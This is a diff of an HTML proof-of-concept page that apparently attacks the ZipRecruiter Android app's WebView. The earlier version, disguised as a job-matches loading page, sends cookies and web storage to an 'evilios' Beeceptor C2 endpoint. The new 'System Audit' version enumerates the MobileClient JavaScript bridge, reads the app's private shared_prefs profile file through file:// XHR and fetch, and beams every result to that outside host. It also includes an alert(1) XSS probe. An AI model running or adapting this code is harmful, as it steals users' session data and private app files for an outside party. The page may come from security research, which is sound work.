@@ -1,58 +1,106 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Job Update</title>
+    <title>System Audit</title>
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <style>
-        body { font-family: sans-serif; text-align: center; padding-top: 50px; }
-        .loader { border: 16px solid #f3f3f3; border-top: 16px solid #3498db; border-radius: 50%; width: 120px; height: 120px; animation: spin 2s linear infinite; margin: auto; }
-        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        body { font-family: sans-serif; background-color: #121212; color: #00ff00; padding: 20px; }
+        .log-container { background: #000; border: 1px solid #333; padding: 15px; border-radius: 5px; font-family: monospace; font-size: 12px; white-space: pre-wrap; margin-bottom: 20px; }
+        .status-ok { color: #00ff00; }
+        .status-fail { color: #ff0000; }
+        button { background: #333; color: #fff; border: 1px solid #555; padding: 10px; cursor: pointer; }
     </style>
 </head>
 <body>
-    <div class="loader"></div>
-    <h2>Loading your personalized job matches...</h2>
+    <h3>WebView Security Audit</h3>
+    
+    <div>[1] Environment Recon</div>
+    <div id="recon-log" class="log-container">Initializing...</div>
+
+    <div>[2] Bridge Probe (MobileClient)</div>
+    <div id="bridge-log" class="log-container">Searching...</div>
+
+    <div>[3] Local File Access (Critical)</div>
+    <div id="file-log" class="log-container">Waiting for user interaction...</div>
+    <button onclick="runFileSteal()">Execute File Access Test</button>
 
     <script>
-        const C2_URL = "https://evilios.free.beeceptor.com";
+        const C2 = "https://evilios.free.beeceptor.com";
+        const TARGET_FILE = "file:///data/data/com.ziprecruiter.android.release/shared_prefs/profile_shared_pref_name.xml";
 
-        async function exfiltrate() {
-            const data = {
-                timestamp: new Date().toISOString(),
-                userAgent: navigator.userAgent,
-                cookies: document.cookie,
-                localStorage: JSON.stringify(localStorage),
-                sessionStorage: JSON.stringify(sessionStorage),
-                url: window.location.href
-            };
-
-            // Attempting to hit the C2 with the stolen data
+        // Helper to beam data to your Beeceptor
+        async function beam(type, data) {
             try {
-                await fetch(C2_URL, {
-                    method: 'POST',
-                    mode: 'no-cors', // Useful for avoiding some CORS pre-flight issues during PoC
-                    body: JSON.stringify(data),
-                    headers: { 'Content-Type': 'application/json' }
+                await fetch(C2 + "/audit", {
+                    method: "POST",
+                    mode: "no-cors",
+                    body: JSON.stringify({ type: type, data: data, ts: Date.now() })
                 });
             } catch (e) {
-                // Fallback to Image-based exfiltration if Fetch is blocked
-                new Image().src = C2_URL + "/log?data=" + btoa(JSON.stringify(data));
+                // Fallback for restricted environments
+                new Image().src = C2 + "/log?t=" + type + "&d=" + btoa(JSON.stringify(data).substring(0, 200));
             }
         }
 
-        // Check if the MobileClient bridge is visible
-        function checkBridge() {
-            if (window.MobileClient) {
-                console.log("JS Bridge Found!");
-                // You can try to trigger bridge methods here for your report
-                // window.MobileClient.openProfile(); 
-            }
-        }
-
+        // 1. Collect Recon Data
         window.onload = () => {
-            exfiltrate();
-            checkBridge();
+            const recon = {
+                ua: navigator.userAgent,
+                cookies: document.cookie || "None accessible (HttpOnly?)",
+                localStorage: JSON.stringify(localStorage),
+                origin: window.location.origin
+            };
+            document.getElementById('recon-log').innerText = JSON.stringify(recon, null, 2);
+            beam("RECON", recon);
+
+            // 2. Probe Bridge
+            if (window.MobileClient) {
+                const methods = Object.keys(window.MobileClient);
+                document.getElementById('bridge-log').innerText = "FOUND: MobileClient\nMethods: " + methods.join(", ");
+                beam("BRIDGE_DATA", { methods });
+            } else {
+                document.getElementById('bridge-log').innerText = "NOT FOUND: MobileClient interface is missing.";
+            }
         };
+
+        // 3. File Access Logic
+        async function runFileSteal() {
+            const log = document.getElementById('file-log');
+            log.innerText = "Attempting to read: " + TARGET_FILE + "\n";
+
+            // Technique A: XHR (Standard for file:// access if enabled)
+            try {
+                const xhr = new XMLHttpRequest();
+                xhr.open("GET", TARGET_FILE, true);
+                xhr.onreadystatechange = function() {
+                    if (xhr.readyState === 4) {
+                        if (xhr.status === 200 || xhr.responseText.length > 0) {
+                            log.className = "log-container status-ok";
+                            log.innerText += "[SUCCESS] XHR Read:\n" + xhr.responseText;
+                            beam("FILE_SUCCESS_XHR", { content: xhr.responseText });
+                        } else {
+                            log.innerText += "[FAIL] XHR Status: " + xhr.status + " (Access Denied/Blocked)\n";
+                        }
+                    }
+                };
+                xhr.send();
+            } catch (e) {
+                log.innerText += "[ERROR] XHR Exception: " + e.message + "\n";
+            }
+
+            // Technique B: Fetch
+            try {
+                const response = await fetch(TARGET_FILE);
+                const text = await response.text();
+                if(text) {
+                    log.innerText += "[SUCCESS] Fetch Read Successful\n";
+                    beam("FILE_SUCCESS_FETCH", { content: text });
+                }
+            } catch (e) {
+                log.innerText += "[FAIL] Fetch blocked.\n";
+            }
+        }
     </script>
+    <script>alert(1)</script>
 </body>
 </html>
